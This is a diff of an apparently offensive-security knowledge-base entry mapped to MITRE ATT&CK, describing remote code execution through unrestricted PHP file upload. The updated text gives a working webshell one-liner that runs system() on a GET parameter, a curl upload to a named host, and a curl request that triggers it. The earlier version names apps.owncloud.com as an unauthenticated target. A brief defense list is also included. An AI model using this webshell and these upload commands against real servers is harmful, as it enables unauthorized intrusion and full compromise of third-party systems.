@@ -1,14 +1,18 @@
 ---
-id: proc-uuid-1
+id: proc-php-upload-rce-001
 tags:
-  - unrestricted-file-upload
   - rce
   - php
+  - file-upload
+  - code-injection
 type: procedure
-tools: []
+tools:
+  - '[[tools/curl]]'
 tactics:
   - '[[Initial Access]]'
-commands: []
+  - '[[Execution]]'
+commands:
+  - '[[commands/curl-php-upload]]'
 verified: false
 platforms:
   - Web
@@ -16,8 +20,9 @@ platforms:
 submitted: true
 created_at: '2023-10-01T00:00:00Z'
 techniques:
-  - '[[Remote File Copy]]'
-updated_at: '2025-12-14T05:32:10.192Z'
+  - '[[Exploit Public-Facing Application]]'
+  - '[[Command-Line Interface]]'
+updated_at: '2025-12-14T17:23:27.303Z'
 skill_level: intermediate
 impact_level: high
 detection_risk: high
@@ -25,83 +30,104 @@ sub_techniques: []
 validated: true
 mitre_tactics:
   - '[[Initial Access]]'
+  - '[[Execution]]'
 mitre_techniques:
-  - '[[Remote File Copy]]'
+  - '[[Exploit Public-Facing Application]]'
+  - '[[Command-Line Interface]]'
 ---
 # Upload-Malicious-PHP-File-for-RCE
 
 ## Summary
 
-This procedure exploits the lack of file type validation in the upload feature of apps.owncloud.com to upload a malicious PHP file, setting the stage for remote code execution by allowing server-side interpretation of the uploaded content.
+This procedure exploits a web application's file upload functionality that lacks proper validation, allowing the upload of PHP files containing malicious code. Once uploaded, the file is executed by the server, enabling remote code execution (RCE) and potential full compromise of the server.
 
 ## Description
 
-In the context of ownCloud's app marketplace, the file upload functionality does not restrict or sanitize file types, permitting PHP files to be uploaded to the CONTENT/content-pre1/ directory where they are served and executed by the PHP interpreter. This leads to full server compromise, including access to databases and arbitrary code execution. The procedure involves creating and uploading a simple PHP payload like phpinfo() to test execution feasibility.
+In vulnerable PHP-based web applications, file upload endpoints often fail to restrict file extensions or content types, permitting users to upload .php files with embedded PHP code. When the server processes or serves these files from an executable directory, the PHP interpreter evaluates the code, leading to arbitrary command execution. This attack targets public-facing upload features, such as those in content management systems or custom apps, and requires only network access to the endpoint. Expected outcomes include running system commands, reading sensitive files, or establishing persistence.
 
 ## Requirements
 
-1. Access to a web browser or HTTP client to interact with https://apps.owncloud.com
-2. No authentication required; public upload endpoint
-3. Basic knowledge of PHP syntax for payload creation
+1. Access to a vulnerable file upload endpoint (e.g., POST to /upload.php)
+2. Network connectivity to the target web server
+3. Basic tools like curl for HTTP requests; no special privileges needed if upload is unauthenticated
 
 ## Defense
 
 Defensive measures and detection strategies:
 
-- Implement strict file type whitelisting (e.g., only allow images or archives) and MIME type validation
-- Scan uploads for executable code using tools like ClamAV or custom regex for PHP tags
-- Serve uploaded files from a non-executable directory or with noexec mount options
-- Monitor server logs for suspicious PHP executions in upload directories
+- Implement strict file type validation (e.g., whitelist extensions like .jpg, .pdf) and content scanning for executable code
+- Store uploads outside the web root or in non-executable directories
+- Use WAF rules to block uploads with .php extensions or suspicious MIME types
+- Monitor server logs for anomalous file uploads and executions
 
 ## Objectives
 
-1. Bypass upload restrictions to place executable code on the server
-2. Confirm upload success and file placement
-3. Prepare for subsequent RCE exploitation
+1. Upload a malicious PHP file to the server
+2. Trigger execution of the uploaded code
+3. Execute arbitrary commands to confirm RCE
 
 ## Instructions
 
-### Step 1: Create Malicious PHP Payload
+### Step 1: Prepare Malicious PHP File
 
-**Context**: Prepare a simple PHP file that executes to reveal server information, confirming the vulnerability.
+**Context**: Create a simple PHP webshell that executes system commands via GET parameters.
 
-Create a file named "171172-1.php5" with the following content:
-
-```php
-<?php phpinfo(); ?>
+**Command** ([[commands/create-php-shell]]):
+```bash
+echo '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>' > shell.php
 ```
 
-> This payload uses the built-in phpinfo() function to output PHP configuration, which will be executed if the file is interpreted as PHP.
+> This generates a basic PHP file named shell.php. The command uses echo to write the PHP code, which checks for a 'cmd' parameter and runs it via system(). Expected output: A file shell.php is created locally.
 
 ### Step 2: Upload the File
 
-**Context**: Use the web interface to upload the file without triggering any validation errors.
+**Context**: Use HTTP POST to upload the file to the vulnerable endpoint, mimicking a standard file upload request.
 
-Navigate to the file upload section on https://apps.owncloud.com and select the prepared PHP file for upload.
+**Command** ([[commands/curl-php-upload]]):
+```bash
+curl -X POST -F "file=@shell.php" http://axa.dxi.eu/upload-endpoint
+```
 
-> Expected output: Upload success message; the file is stored in CONTENT/content-pre1/ without rejection.
+> Replace the URL with the actual upload endpoint (e.g., /upload.php). The -F flag sends the file as multipart/form-data. Expected output: HTTP 200 OK or success message indicating upload completion; check response for file path.
+
+### Step 3: Trigger Execution
+
+**Context**: Access the uploaded file directly to execute the PHP code and run a test command.
+
+**Command** ([[commands/curl-execute-php]]):
+```bash
+curl "http://axa.dxi.eu/uploads/shell.php?cmd=id"
+```
+
+> Assuming the file is stored in /uploads/, this executes the 'id' command. Expected output: Server response showing user/group IDs, confirming RCE (e.g., "uid=33(www-data) gid=33(www-data)").
 
 ## MITRE ATT&CK Mapping
 
 ### Tactics
 
-- [[Initial Access]] Initial Access
+- [[Initial Access]]
+- [[Execution]]
 
 ### Techniques
 
-- [[Remote File Copy]] Ingress Tool Transfer
+- [[Exploit Public-Facing Application]]
+- [[Command-Line Interface]]
 
 ### Sub-Techniques
 
 
 ## Commands Used
 
+- [[commands/create-php-shell]]
+- [[commands/curl-php-upload]]
+- [[commands/curl-execute-php]]
 
 ## Tools Used
 
+- [[tools/curl]]
 
 ## Tags
 
-- [[unrestricted-file-upload]]
-- [[rce]]
-- [[php]]
+- rce
+- php
+- file-upload
